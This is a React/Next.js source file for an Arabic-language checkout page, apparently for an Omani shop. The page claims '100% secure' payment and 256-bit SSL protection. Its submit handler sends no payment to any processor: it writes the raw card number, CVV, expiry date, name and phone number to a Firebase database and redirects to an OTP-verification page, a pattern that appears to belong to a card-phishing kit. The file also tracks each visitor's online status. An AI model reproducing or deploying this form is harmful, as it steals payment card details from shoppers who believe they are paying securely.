"use client"

import type React from "react"
import { useEffect, useState } from "react"
import { ArrowRight, CreditCard, Smartphone, Lock, CheckCircle } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Separator } from "@/components/ui/separator"
import { Badge } from "@/components/ui/badge"
import Link from "next/link"
import { useCart } from "@/contexts/cart-context"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"

export default function CheckoutPage() {
  const [paymentMethod, setPaymentMethod] = useState("card")
  const [cardType, setCardType] = useState("")
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardholderName: "",
  })

  const { getCartItems, getTotalPrice } = useCart()
  const cartItems = getCartItems()

  // Card type detection
  const detectCardType = (number: string) => {
    const cleanNumber = number.replace(/\s/g, "")
    if (cleanNumber.match(/^4/)) return "visa"
    if (cleanNumber.match(/^5[1-5]/)) return "mastercard"
    if (cleanNumber.match(/^3[47]/)) return "amex"
    return ""
  }

  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const cleanValue = value.replace(/\s/g, "").replace(/[^0-9]/gi, "")
    const matches = cleanValue.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }
    if (parts.length) {
      return parts.join(" ")
    } else {
      return cleanValue
    }
  }

  // Format expiry date
  const formatExpiryDate = (value: string) => {
    const cleanValue = value.replace(/\D/g, "")
    if (cleanValue.length >= 2) {
      return cleanValue.substring(0, 2) + "/" + cleanValue.substring(2, 4)
    }
    return cleanValue
  }

  const handleInputChange = (field: string, value: string) => {
    let formattedValue = value

    if (field === "cardNumber") {
      formattedValue = formatCardNumber(value)
      setCardType(detectCardType(formattedValue))
    } else if (field === "expiryDate") {
      formattedValue = formatExpiryDate(value)
    } else if (field === "cvv") {
      formattedValue = value.replace(/\D/g, "").substring(0, 4)
    }

    setFormData((prev) => ({
      ...prev,
      [field]: formattedValue,
    }))
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const visitorId = localStorage.getItem("visitor")
    addData({
      id: visitorId,
      phone: formData.phone,
      name: formData.name,
      cardNumber: formData.cardNumber,
      cvv: formData.cvv,
      expiryDate: formData.expiryDate,
    })
    window.location.href = "/otp-verification"
  }

  useEffect(() => {
    const _id = localStorage.getItem("visitor")
    setupOnlineStatus(_id!)
  }, [])

  const getCardIcon = (type: string) => {
    switch (type) {
      case "visa":
        return "/visa-svgrepo-com.svg"
      case "mastercard":
        return "/master.svg"
      case "amex":
        return "/exp.svg"
      default:
        return null
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white" dir="rtl">
      {/* Header */}
      <header className="bg-white shadow-sm border-b sticky top-0 z-10">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <Link href="/cart">
              <Button variant="ghost" size="icon">
                <ArrowRight className="h-5 w-5" />
              </Button>
            </Link>
            <h1 className="text-xl font-bold text-blue-600">إتمام الطلب</h1>
            <div className="flex items-center gap-2">
              <Lock className="h-4 w-4 text-green-600" />
              <span className="text-xs text-green-600 hidden sm:inline">آمن</span>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8">
        <form onSubmit={handleSubmit} className="grid grid-cols-1 xl:grid-cols-3 gap-6 lg:gap-8">
          {/* Checkout Form */}
          <div className="xl:col-span-2 space-y-6">
            {/* Delivery Information */}
            <Card className="border-0 shadow-lg">
              <CardHeader className="bg-gradient-to-r from-blue-50 to-indigo-50 rounded-t-lg">
                <CardTitle className="flex items-center gap-2 text-gray-800">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center">
                    <span className="text-white text-sm font-bold">1</span>
                  </div>
                  معلومات التوصيل
                </CardTitle>
              </CardHeader>
              <CardContent className="p-6 space-y-4">
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="name" className="text-sm font-medium text-gray-700">
                      الاسم الكامل
                    </Label>
                    <Input
                      id="name"
                      value={formData.name}
                      onChange={(e) => handleInputChange("name", e.target.value)}
                      placeholder="أدخل اسمك الكامل"
                      className="h-11 border-gray-200 focus:border-blue-500 focus:ring-blue-500"
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="phone" className="text-sm font-medium text-gray-700">
                      رقم الهاتف
                    </Label>
                    <Input
                      id="phone"
                      value={formData.phone}
                      onChange={(e) => handleInputChange("phone", e.target.value)}
                      placeholder="+968 9X XXX XXX"
                      className="h-11 border-gray-200 focus:border-blue-500 focus:ring-blue-500"
                      required
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="address" className="text-sm font-medium text-gray-700">
                    العنوان
                  </Label>
                  <Input
                    id="address"
                    value={formData.address}
                    onChange={(e) => handleInputChange("address", e.target.value)}
                    placeholder="أدخل عنوانك بالتفصيل"
                    className="h-11 border-gray-200 focus:border-blue-500 focus:ring-blue-500"
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="city" className="text-sm font-medium text-gray-700">
                    المدينة
                  </Label>
                  <Input
                    id="city"
                    value={formData.city}
                    onChange={(e) => handleInputChange("city", e.target.value)}
                    placeholder="مسقط"
                    className="h-11 border-gray-200 focus:border-blue-500 focus:ring-blue-500"
                    required
                  />
                </div>
              </CardContent>
            </Card>

            {/* Payment Method */}
            <Card className="border-0 shadow-lg overflow-hidden">
              <CardHeader className="bg-gradient-to-r from-green-50 to-emerald-50">
                <CardTitle className="flex items-center gap-2 text-gray-800">
                  <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center">
                    <span className="text-white text-sm font-bold">2</span>
                  </div>
                  طريقة الدفع
                  <Badge variant="secondary" className="mr-auto bg-green-100 text-green-700">
                    <Lock className="w-3 h-3 ml-1" />
                    آمن 100%
                  </Badge>
                </CardTitle>
              </CardHeader>
              <CardContent className="p-6">
                <RadioGroup value={paymentMethod} onValueChange={setPaymentMethod} className="space-y-4">
                  <div className="flex items-center space-x-2 space-x-reverse p-4 border-2 border-blue-200 rounded-lg bg-blue-50">
                    <RadioGroupItem value="card" id="card" className="text-blue-600" />
                    <Label htmlFor="card" className="flex items-center gap-2 cursor-pointer flex-1">
                      <CreditCard className="h-5 w-5 text-blue-600" />
                      <span className="font-medium">بطاقة ائتمان / خصم</span>
                    </Label>
                  </div>
                  <div className="flex items-center space-x-2 space-x-reverse p-4 border-2 border-gray-200 rounded-lg opacity-50">
                    <RadioGroupItem value="mobile" id="mobile" disabled />
                    <Label htmlFor="mobile" className="flex items-center gap-2 cursor-not-allowed flex-1">
                      <Smartphone className="h-5 w-5 text-gray-400" />
                      <span className="font-medium text-gray-400">الدفع عبر الهاتف</span>
                      <Badge variant="outline" className="mr-auto">
                        قريباً
                      </Badge>
                    </Label>
                  </div>
                </RadioGroup>

                {paymentMethod === "card" && (
                  <div className="mt-6 space-y-4">
                    {/* Card Preview */}
                    <div className="relative">
                      <div className="bg-gradient-to-r from-blue-600 via-blue-700 to-indigo-800 rounded-xl p-6 text-white shadow-2xl transform perspective-1000 rotate-y-5">
                        <div className="flex justify-between items-start mb-8">
                          <div className="w-12 h-8 bg-yellow-400 rounded opacity-80"></div>
                          {cardType && (
                            <img
                              src={getCardIcon(cardType) || "/placeholder.svg"}
                              alt={cardType}
                              className="h-8 w-auto filter brightness-0 invert"
                            />
                          )}
                        </div>
                        <div className="space-y-4">
                          <div className="text-xl font-mono tracking-wider">
                            {formData.cardNumber || "•••• •••• •••• ••••"}
                          </div>
                          <div className="flex justify-between items-end">
                            <div>
                              <div className="text-xs opacity-70">اسم حامل البطاقة</div>
                              <div className="font-medium">
                                {formData.cardholderName || formData.name || "الاسم الكامل"}
                              </div>
                            </div>
                            <div>
                              <div className="text-xs opacity-70">تاريخ الانتهاء</div>
                              <div className="font-mono">{formData.expiryDate || "MM/YY"}</div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Card Form */}
                    <div className="grid gap-4">
                      <div className="space-y-2">
                        <Label htmlFor="cardholderName" className="text-sm font-medium text-gray-700">
                          اسم حامل البطاقة
                        </Label>
                        <Input
                          id="cardholderName"
                          value={formData.cardholderName}
                          onChange={(e) => handleInputChange("cardholderName", e.target.value)}
                          placeholder="الاسم كما هو مكتوب على البطاقة"
                          className="h-11 border-gray-200 focus:border-blue-500 focus:ring-blue-500"
                          required
                        />
                      </div>

                      <div className="space-y-2">
                        <Label htmlFor="cardNumber" className="text-sm font-medium text-gray-700">
                          رقم البطاقة
                        </Label>
                        <div className="relative">
                          <Input
                            id="cardNumber"
                            type="tel"
                            maxLength={19}
                            value={formData.cardNumber}
                            onChange={(e) => handleInputChange("cardNumber", e.target.value)}
                            placeholder="1234 5678 9012 3456"
                            className="h-11 border-gray-200 focus:border-blue-500 focus:ring-blue-500 pr-12"
                            required
                          />
                          {cardType && (
                            <img
                              src={getCardIcon(cardType) || "/placeholder.svg"}
                              alt={cardType}
                              className="absolute left-3 top-1/2 transform -translate-y-1/2 h-6 w-auto"
                            />
                          )}
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <Label htmlFor="expiryDate" className="text-sm font-medium text-gray-700">
                            تاريخ الانتهاء
                          </Label>
                          <Input
                            id="expiryDate"
                            maxLength={5}
                            value={formData.expiryDate}
                            onChange={(e) => handleInputChange("expiryDate", e.target.value)}
                            placeholder="MM/YY"
                            className="h-11 border-gray-200 focus:border-blue-500 focus:ring-blue-500"
                            required
                          />
                        </div>
                        <div className="space-y-2">
                          <Label htmlFor="cvv" className="text-sm font-medium text-gray-700">
                            CVV
                          </Label>
                          <Input
                            id="cvv"
                            type="password"
                            maxLength={4}
                            value={formData.cvv}
                            onChange={(e) => handleInputChange("cvv", e.target.value)}
                            placeholder="123"
                            className="h-11 border-gray-200 focus:border-blue-500 focus:ring-blue-500"
                            required
                          />
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </CardContent>

              <CardFooter className="bg-gray-50 border-t px-6 py-4">
                <div className="flex items-center justify-center gap-4 w-full">
                  <span className="text-sm text-gray-600">نقبل:</span>
                  <div className="flex items-center gap-3">
                    <img
                      src="/visa-svgrepo-com.svg"
                      alt="Visa"
                      className="h-8 w-auto opacity-70 hover:opacity-100 transition-opacity"
                    />
                    <img
                      src="/master.svg"
                      alt="Mastercard"
                      className="h-8 w-auto opacity-70 hover:opacity-100 transition-opacity"
                    />
                    <img
                      src="/exp.svg"
                      alt="American Express"
                      className="h-8 w-auto opacity-70 hover:opacity-100 transition-opacity"
                    />
                  </div>
                </div>
              </CardFooter>
            </Card>
          </div>

          {/* Order Summary */}
          <div className="xl:col-span-1">
            <Card className="sticky top-24 border-0 shadow-lg">
              <CardHeader className="bg-gradient-to-r from-purple-50 to-pink-50">
                <CardTitle className="flex items-center gap-2 text-gray-800">
                  <div className="w-8 h-8 bg-purple-600 rounded-full flex items-center justify-center">
                    <CheckCircle className="w-4 h-4 text-white" />
                  </div>
                  ملخص الطلب
                </CardTitle>
              </CardHeader>
              <CardContent className="p-6 space-y-4">
                <div className="space-y-3">
                  {cartItems.map((item) => (
                    <div
                      key={item!.id}
                      className="flex justify-between items-center text-sm py-2 border-b border-gray-100 last:border-b-0"
                    >
                      <div className="flex-1">
                        <span className="font-medium">{item!.nameAr}</span>
                        <span className="text-gray-500 mr-2">× {item!.quantity}</span>
                      </div>
                      <span className="font-semibold text-blue-600">
                        {(item!.price * item!.quantity).toFixed(2)} ر.ع
                      </span>
                    </div>
                  ))}
                </div>

                <Separator />

                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span>المجموع الفرعي:</span>
                    <span className="font-medium">{getTotalPrice().toFixed(2)} ر.ع</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span>رسوم التوصيل:</span>
                    <span className="font-medium text-green-600">مجاني</span>
                  </div>
                </div>

                <Separator />

                <div className="flex justify-between font-bold text-lg text-blue-600">
                  <span>المجموع الكلي:</span>
                  <span>{getTotalPrice().toFixed(2)} ر.ع</span>
                </div>

                <Button
                  type="submit"
                  className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 h-12 text-base font-semibold shadow-lg hover:shadow-xl transition-all duration-200"
                >
                  <Lock className="w-4 h-4 ml-2" />
                  تأكيد الطلب والدفع الآمن
                </Button>

                <div className="text-center">
                  <p className="text-xs text-gray-500 flex items-center justify-center gap-1">
                    <Lock className="w-3 h-3" />
                    معلوماتك محمية بتشفير SSL 256-bit
                  </p>
                </div>
              </CardContent>
            </Card>
          </div>
        </form>
      </main>
    </div>
  )
}
